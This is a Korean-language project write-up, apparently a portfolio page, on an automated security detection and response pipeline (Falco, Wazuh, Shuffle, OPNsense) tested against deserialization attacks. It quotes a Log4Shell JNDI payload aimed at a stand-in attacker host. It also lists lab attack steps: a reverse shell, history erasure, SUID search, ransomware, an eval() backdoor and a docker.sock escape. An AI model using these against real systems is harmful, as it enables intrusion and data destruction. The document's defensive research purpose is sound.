## 프로젝트 배경

역직렬화 기반 제로데이 공격은 기존 시그니처 기반 보안 솔루션으로는 탐지가 어려워 초기 침해를 놓치게 됩니다. 이후 수동 대응 과정에서 지연이 발생하며 공격이 내부 시스템으로 확산되고, MTTR 증가로 이어지는 문제가 발생합니다.
이러한 환경에서 탐지 여부와 관계없이 신속한 대응을 수행하기 위한 “침해가정(Assume Breach)” 기반 보안 운영 방식의 필요성이 증가하고 있습니다.

***

## 주요 성과

- **MTTR 단축:** 수동 대응 시 15~30분 소요되던 시간을 **10초 이내(98%+)**로 단축(최종 시나리오 기준 50회 테스트 평균값 기준)
- **탐지율(TDR):** 역직렬화 기반 Remote Shell 100%, 랜섬웨어(FIM) 85%, 권한 상승 90% 달성(공격시나리오 3종{1,2차 고도화 공격 포함}, 각 40-50회 반복 테스트 기준)
- **대응 성공률:** 격리 및 차단 자동화 성공률 100% (권한 상승은 80%)

***

## 핵심 아키텍처 및 파이프라인

![시스템 아키텍처]({{ site.baseurl }}/assets/images/Network%20Architecture.jpg)

1. **수집 (Falco → Wazuh)**:
Falco가 커널 시스템 콜 이벤트를 탐지하여 JSON 형태로 생성하고, 이를 Wazuh Agent를 통해 중앙 서버로 전송하여 분산 로그를 수집합니다.

2. **정규화 (Wazuh)**:
수집된 Falco 이벤트와 시스템 로그를 Wazuh에서 표준 포맷으로 정규화하고, Agent ID 및 호스트 정보를 기반으로 자산과 매핑합니다.

3. **다차원 분석 (Wazuh → Shuffle)**:
정규화된 이벤트를 Shuffle로 전달하여, AbuseIPDB(IP 평판), MISP(해시), SCA(취약점) 등 외부 위협 인텔리전스와 연계한 다차원 분석을 수행합니다. 이를 통해 네트워크 행위(IP), 파일 무결성(해시), 시스템 취약점 상태를 각각 검증하여 단일 지표에 의존하지 않는 종합적인 위협 판단이 가능하도록 설계했습니다.

4. **상관 분석 및 스코어링 (Shuffle)**:
공격 행위의 위험도는 MITRE ATT&CK 및 Cyber Kill Chain 단계별 치명도를 기준으로 정량화하고, 여기에 자산 취약도(SCA)와 외부 위협 인텔리전스(IP 평판, 해시 IoC)를 결합한 스코어링 모델을 적용했습니다. 이를 통해 단일 이벤트가 아닌 누적 위험 기반 의사결정 구조로 위협을 판단합니다.

5. **자동 대응 (Shuffle → OPNsense 등)**:
분석 결과를 기반으로 방화벽(OPNsense) 차단, 호스트 격리, 알림 전송 등을 수행하여 위협을 실시간으로 대응합니다.

## 7단계 공격 시나리오 (React2Shell)

다중 언어(Java, PHP, Node.js) 역직렬화 취약점을 선행 연구하여 도출한 **"공격 성공 후 시스템 콜 행위는 수렴한다"**는 가설을 바탕으로 단일화된 공격 시나리오를 검증했습니다.
* **Java**: /bin/sh 실행 및 리버스 쉘 연결, 비정상 프로세스 fork 발생

* **PHP**: 웹 서버 프로세스(apache2) 기반 쉘 실행 및 외부 C2 연결

* **Node.js**: child_process 기반 쉘 실행, /tmp 경로 파일 생성 및 chmod 수행

| 단계 | 공격 행위 | MITRE ATT&CK | 탐지 등급 |
|------|----------|-------------|----------|
| 1. 초기 침투 | React2Shell 페이로드 → 리버스 쉘 | TA0001 (T1190) | **CRITICAL** |
| 2. 정찰 | `env`, `whoami`, `ifconfig` 실행 | TA0007 (T1082) | WARNING |
| 3. 방어 회피 | 히스토리 삭제 (`HISTFILE=/dev/null`) | TA0005 (T1070.003) | **CRITICAL** |
| 4. 권한 상승 | SUID 바이너리 탐색 | TA0004 (T1548.001) | **CRITICAL** |
| 5. 랜섬웨어 | Python 메모리 내 실행 + 암호화 | TA0040 (T1486) | **CRITICAL** |
| 6. 지속성 | API Route에 `eval()` 백도어 삽입 | TA0003 (T1505.003) | DETECT |
| 7. 탈출 | `docker.sock` 악용 → 호스트 루트 탈취 | TA0004 (T1611) | **CRITICAL** |

## 담당 업무 및 기여

### 1. Java 역직렬화(Log4Shell) 공격 연구 및 범용 룰 도출

- **취약점 재현:** Log4j2 JNDI Lookup을 악용한 `${jndi:ldap://attacker.com/exploit}` 페이로드로 Docker 환경에서 RCE 성공 과정을 구현했습니다.
- **행위 수렴 가설 실증:** RCE 직후 PID 1(Java)의 자식으로 `/bin/sh`가 생성되는 비정상 계보를 포착했습니다. 이를 PHP와 Node.js에서도 동일하게 확인하여, 언어 종속성을 탈피한 시스템 콜 기반 공통 탐지 정책의 핵심 근거를 마련했습니다.

### 2. Wazuh SIEM 대시보드 및 탐지 엔진 고도화
![local rule]({{ site.baseurl }}/assets/images/rules.png)
- **Falco 이벤트 파싱 및 TID 매핑**:
Falco에서 생성된 JSON 이벤트를 Wazuh Agent를 통해 수집한 뒤, Wazuh Rule Engine에서 처리할 수 있도록 **필드 구조를 재구성(decoding)**했습니다. 이후 각 이벤트를 MITRE ATT&CK 기반 Tactic/Technique ID(TID)와 매핑하고, 탐지 규칙에 따라 rule.level을 동적으로 부여했습니다.

- **CDB & FIM 연동**:
CDB 리스트를 활용해 실시간 IoC(IP/Hash) 대조 환경을 구성하고, FIM 이벤트와 결합하여 일정 시간(10분) 내 대량 파일 변경 발생 시 랜섬웨어 행위로 식별하는 상관 분석 룰을 설계했습니다.

- **가시성 확보**:
탐지 이벤트에 MITRE ATT&CK Tactic/Technique ID를 자동 매핑하여, 공격 흐름을 시각적으로 파악할 수 있는 대시보드를 구축했습니다.

### 3. MISP 위협 인텔리전스(TI) 기반 교차 검증 파이프라인

- MISP 플랫폼을 Shuffle 워크플로우에 연동하여, FIM이 감지한 파일 해시값을 MISP API로 자동 대조했습니다.
- 외부 TI 데이터는 단독 사용 시 오탐률이 높게 나타나는 것을 반복 실험으로 확인하여, 스코어링 영향도를 최소화하기 위해 **보조 가중치(×0.1)**로 제한했습니다. 이를 통해 내부 행위 기반 탐지를 중심으로 유지하면서, TI는 보조 검증 지표로 활용하는 구조를 설계했습니다.

### 4. 선제적 포렌식 증거 보존 스크립트(Active Response) 개발

- 네트워크 격리 이후 원격 IP 및 세션 정보와 같은 휘발성 데이터가 즉시 소멸되면서, 공격자의 C2 서버 추적이나 세션 기반 분석이 불가능해지는 문제가 발생했습니다. 이로 인해 침해 원인 분석 및 포렌식 대응이 제한되는 한계를 확인했습니다. 따라서 Critical 등급 시 네트워크 차단 직전 netstat, 프로세스 트리, 환경 변수 등 휘발성 데이터를 로컬 스냅샷으로 저장하는 shell script 기반 Active Response 스크립트를 개발했습니다.

### 5. 문서화 및 프로젝트 총괄 리드

- 아키텍처 설계 주도: Falco → Wazuh → Shuffle → Active Response로 이어지는 자동 대응 파이프라인 구조를 설계하고, 각 구성 요소 간 데이터 흐름과 역할을 정의했습니다.

- 일일·주간 결산 관리: 일일 단위로 작업 진행 상황과 이슈를 정리하고, 주간 단위로 목표 대비 진척률과 리스크를 점검했습니다. 이를 통해 일정 지연 요인을 조기에 식별하고 개발 우선순위를 조정하여 프로젝트 진행 안정성을 확보했습니다.

- 성과 중심 문서화: 프로젝트 착수 보고서, 프로젝트 중간보고서, MTTR 감소율, 노이즈 제거율 등 정량 지표를 포함한 기술 보고서룰 작성하여 프로젝트 결과를 체계적으로 정리했습니다.


## 기술 의사결정 및 트러블슈팅
단순한 오류 수정을 넘어, 시스템의 안정성과 탐지 정확도를 높이기 위한 엔지니어링 관점의 문제 해결에 집중했습니다.

### 1. 커널 레벨 가시성 확보를 위한 아키텍처 변경
Situation (상황): 초기 설계 시 프로세스 모니터링을 위해 Sysmon을 도입했으나, 타겟 서버(Ubuntu) 환경에서 치명적인 호환성 충돌이 발생해 가시성 확보에 실패했습니다.

Action (행동): OS 종속적인 Sysmon 대신, eBPF 기반으로 커널 레벨에서 시스템 콜을 직접 수집할 수 있는 Falco로 아키텍처를 전환했습니다. 이를 통해 OS 종속성 제거 (Linux 환경에 최적화), 커널 레벨 시스템 콜 기반 가시성 확보, 컨테이너 환경에서의 런타임 행위를 추적 가능 하도록 설계했습니다.
Result (결과): 호환성 이슈를 완벽히 해결하고, 컨테이너 내부에서 발생하는 시스템 콜(execve, openat 등)을 실시간으로 추적하는 딥(Deep) 레벨의 모니터링 환경을 구축했습니다.

### 2. 오탐(False Positive) 제거 및 탐지 정책 일원화
Situation (상황): Falco 기본 룰셋이 관리자의 정상적인 패키지 설치 행위까지 위협으로 간주하여 알림 피로도(Alert Fatigue)가 매우 높고 58% 수준의 높은 오탐률이 발생했습니다. 또한 Java, PHP, Node.js 언어별로 탐지 시나리오를 분리 운영하여 룰 유지보수 비용이 높았습니다.

Action (행동): 정상적인 대화형 쉘 접근과 악성 리버스 쉘을 구분하기 위해 proc.pcmdline에 -i (대화형) 옵션 검사 로직을 추가하고, 정상 행위 화이트리스트를 튜닝했습니다.
3개 언어의 역직렬화 공격 성공 후 "비정상 쉘 생성"이라는 공통분모를 도출해, 탐지 정책을 React2Shell 기반 단일 시나리오로 통합했습니다.

Result (결과): 불필요한 노이즈(오탐)를 85% 이상 제거하여 오탐률을 8%로 감소시켜 관제 효율을 높였으며, 범용 룰 적용을 통해 보안 정책 유지보수 리소스를 대폭 절감했습니다.

### 3. 상태 유지형(Stateful) 자동화 스코어링 엔진 안정화
Situation (상황): SOAR 툴을 워크플로우가 유연한 Shuffle로 마이그레이션했으나, Agent ID 캐시 초기화 타이밍 오류로 인해 '누적 위험도 점수'가 간헐적으로 리셋되는 치명적 버그가 발생했습니다.

Action (행동): 개별 경고가 아닌 공격의 흐름(Context)을 기억하도록 Agent ID → 누적 점수(accumulated_score), 이벤트 히스토리 구조로 상태를 관리했습니다. 또한 Shuffle 내부 저장소를 활용해 과거 점수, 분석된 IP/해시(checked_ips, checked_hashes)를 지속적으로 참조하여,단편 이벤트가 아닌 공격 흐름(Context)을 기반으로 위험도를 산출했습니다. 마지막으로 자산별로 점수를 독립적으로 관리하여, 다수 서버 환경에서 발생하는 노이즈 간섭(Noisy Neighbor)을 차단하고 분석 정확도를 확보했습니다.

Result (결과): 단편적 탐지가 아닌 누적 점수 기반의 Stateful 스코어링 엔진을 완성하여, 점수 합산 오류로 인한 정상 서버의 잘못된 네트워크 격리를 최대한 차단했습니다.
